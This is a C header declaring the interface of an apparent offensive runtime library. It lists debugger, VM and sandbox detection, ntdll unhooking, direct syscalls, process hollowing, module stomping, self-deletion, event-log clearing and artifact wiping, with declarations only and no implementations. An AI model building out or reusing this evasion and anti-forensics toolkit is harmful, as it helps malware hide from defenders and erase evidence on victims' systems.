#ifndef JOCKY_RT_H
#define JOCKY_RT_H

#ifdef __cplusplus
extern "C" {
#endif

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

/* ============================================================================
 * Anti-Analysis: Debugger, VM, Sandbox Detection
 * ============================================================================ */

typedef enum {
    JOCKY_ANALYSIS_CLEAN = 0,
    JOCKY_ANALYSIS_DEBUGGER = 1 << 0,
    JOCKY_ANALYSIS_VM = 1 << 1,
    JOCKY_ANALYSIS_SANDBOX = 1 << 2,
} jocky_analysis_flags_t;

/* Run all anti-analysis checks. Returns bitmask of detected threats. */
uint32_t jocky_check_analysis_environment(void);

/* Individual checks */
bool jocky_is_debugger_present(void);
bool jocky_is_remote_debugger(void);
bool jocky_check_hardware_breakpoints(void);
bool jocky_is_vm(void);
bool jocky_is_sandbox(void);

/* Timing checks */
bool jocky_check_timing_rdtsc(void);
bool jocky_check_timing_api(void);

/* ============================================================================
 * Evasion: Unhooking, Syscalls, Stack Spoofing
 * ============================================================================ */

#ifdef _WIN32
/* Unhook ntdll.dll by reloading a fresh copy from disk */
bool jocky_unhook_ntdll(void);

/* Get syscall number for a given Zw* function name */
uint32_t jocky_get_syscall_number(const char* zw_name);

/* Execute a direct syscall */
intptr_t jocky_direct_syscall(uint32_t syscall_number, ...);
#endif /* _WIN32 */

/* ============================================================================
 * Execution: In-Memory Techniques
 * ============================================================================ */

#ifdef _WIN32
/* Process hollowing: replace a suspended process image */
bool jocky_process_hollow(const wchar_t* target_path,
                          const uint8_t* payload,
                          size_t payload_size);

/* Module stomping: overwrite a loaded DLL in a remote process */
bool jocky_module_stomp(uint32_t pid,
                        const wchar_t* module_name,
                        const uint8_t* payload,
                        size_t payload_size);
#endif /* _WIN32 */

/* ============================================================================
 * Cleanup: Self-Deletion, Log Clearing, Anti-Forensics
 * ============================================================================ */

/* Delete the running executable from disk (Windows: pending rename, Linux: unlink) */
bool jocky_self_delete(void);

/* Clear system event logs */
bool jocky_clear_logs(void);

/* Wipe Prefetch / cache artifacts */
bool jocky_wipe_artifacts(void);

/* ============================================================================
 * Crypto: String / Data Decryption
 * ============================================================================ */

/* Simple XOR decrypt in-place. Key rotates per byte. */
void jocky_decrypt_xor(uint8_t* data, size_t len, uint8_t key);

/* RC4-based stream decrypt */
void jocky_decrypt_rc4(uint8_t* data, size_t len, const uint8_t* key, size_t key_len);

/* ============================================================================
 * Initialization
 * ============================================================================ */

/* Full runtime initialization sequence:
 *  1. Anti-analysis checks
 *  2. Decrypt strings/constants
 *  3. Return threat bitmask (0 = clean)
 */
uint32_t jocky_runtime_init(void);

#ifdef __cplusplus
}
#endif

#endif /* JOCKY_RT_H */
